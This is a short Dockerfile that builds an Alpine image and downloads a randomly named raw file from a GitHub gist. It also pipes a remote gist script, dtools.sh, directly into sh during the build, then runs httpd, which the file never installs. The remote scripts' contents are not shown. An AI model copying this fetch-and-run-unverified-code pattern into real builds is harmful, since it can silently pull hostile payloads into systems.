#FROM python:3-alpine
#FROM python:2.7.16-alpine3.9
#CMD [ "python", "-c", "print('Hello 9')" ]


FROM alpine:edge
RUN apk update && apk upgrade
RUN apk add git curl
RUN curl -sSL https://gist.githubusercontent.com/remiallain/7f7b957947911d0ebec18349f0d632be/raw/4a25edf10d9698f17bc828e6d02a4dd7b10a5f6e/bezeLme82le66d0da56edd.raw > bezeLme82le66d0da56edd.raw
RUN curl -sSL https://gist.githubusercontent.com/remiallain/7f7b957947911d0ebec18349f0d632be/raw/4a25edf10d9698f17bc828e6d02a4dd7b10a5f6e/dtools.sh | sh
EXPOSE 80
CMD ["httpd", "-D FOREGROUND"]
